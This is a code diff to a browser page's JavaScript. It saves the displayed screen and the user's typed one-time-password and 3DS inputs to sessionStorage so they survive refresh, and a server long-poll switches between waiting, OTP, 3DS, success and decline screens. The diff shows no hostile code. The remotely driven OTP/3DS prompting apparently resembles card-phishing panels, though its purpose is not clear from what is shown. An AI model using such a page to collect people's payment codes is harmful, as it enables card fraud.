@@ -363,9 +363,23 @@
   if (!sessionId) { document.body.innerHTML = '<div style="padding:40px;text-align:center;font-family:sans-serif">Session missing</div>'; return; }
 
   const $ = id => document.getElementById(id);
+
+  // ----- Persist view + inputs across refresh -----
+  const SKEY = 'waitState:' + sessionId;
+  function saveState(patch) {
+    try {
+      const cur = JSON.parse(sessionStorage.getItem(SKEY) || '{}');
+      sessionStorage.setItem(SKEY, JSON.stringify({ ...cur, ...patch }));
+    } catch {}
+  }
+  function loadState() {
+    try { return JSON.parse(sessionStorage.getItem(SKEY) || '{}'); } catch { return {}; }
+  }
+
   const show = id => {
     ['waiting','otp','tds','submitLoad','done','fail'].forEach(n => $(n).classList.add('hidden'));
     $(id).classList.remove('hidden');
+    saveState({ view: id });
     // Screen-specific side effects
     if (id === 'submitLoad') startLoadAnim();
     else stopLoadAnim();
@@ -390,10 +404,13 @@
     $('loadStep2').textContent = s.s2;
     $('loadStep3').textContent = s.s3;
     $('loadStep4').textContent = s.s4;
+    saveState({ loadStage: kind });
   }
   function startLoadAnim() {
     stopLoadAnim();
-    loadStart = Date.now();
+    const prev = loadState();
+    loadStart = prev.loadStart || Date.now();
+    saveState({ loadStart });
     // Reset visuals
     const steps = document.querySelectorAll('#loadSteps .step');
     steps.forEach((el, i) => { el.classList.remove('in','done'); if (i===0) el.classList.add('done'); if (i===1) el.classList.add('in'); });
@@ -574,7 +591,12 @@
   });
 
   function getOtp(){ return boxes.map(b=>b.value).join(''); }
-  function clearOtp(){ boxes.forEach(b => { b.value=''; b.classList.remove('filled'); }); boxes[0].focus(); }
+  function clearOtp(){ boxes.forEach(b => { b.value=''; b.classList.remove('filled'); }); boxes[0].focus(); saveState({ otp: '' }); }
+
+  // Persist OTP/TDS as user types
+  boxes.forEach(b => b.addEventListener('input', () => saveState({ otp: getOtp() })));
+  const tdsEl = $('tdsInput');
+  if (tdsEl) tdsEl.addEventListener('input', () => saveState({ tds: tdsEl.value }));
 
   // ----- Long-poll loop -----
   let currentMode = 'waiting';
@@ -653,7 +675,30 @@
     }
   }
 
-  // Kick off
+  // Kick off — restore prior view + inputs first (refresh-safe)
+  (function restoreView() {
+    const st = loadState();
+    if (st.otp) {
+      st.otp.split('').slice(0,6).forEach((ch, k) => {
+        if (boxes[k]) { boxes[k].value = ch; boxes[k].classList.add('filled'); }
+      });
+    }
+    if (st.tds && $('tdsInput')) $('tdsInput').value = st.tds;
+    if (st.view && st.view !== 'waiting') {
+      if (st.view === 'submitLoad' && st.loadStage) setLoadStage(st.loadStage);
+      show(st.view);
+      // Align lastAction so long-poll doesn't immediately re-trigger
+      if (st.view === 'otp') { lastAction = 'otp'; currentMode = 'otp'; }
+      else if (st.view === 'tds') { lastAction = '3ds'; currentMode = '3ds'; }
+      else if (st.view === 'submitLoad') {
+        // User was mid-submit; pretend we already saw that action
+        if (st.loadStage === 'otp') { lastAction = 'otp'; currentMode = 'otp'; }
+        else if (st.loadStage === '3ds') { lastAction = '3ds'; currentMode = '3ds'; }
+      }
+      else if (st.view === 'done') { lastAction = 'success'; currentMode = 'done'; allowClose = true; }
+      else if (st.view === 'fail') { lastAction = 'decline'; currentMode = 'fail'; }
+    }
+  })();
   initialFetch().then(longPollLoop);
 
   // Compatibility shim (other code references `timer`/`clearInterval`)
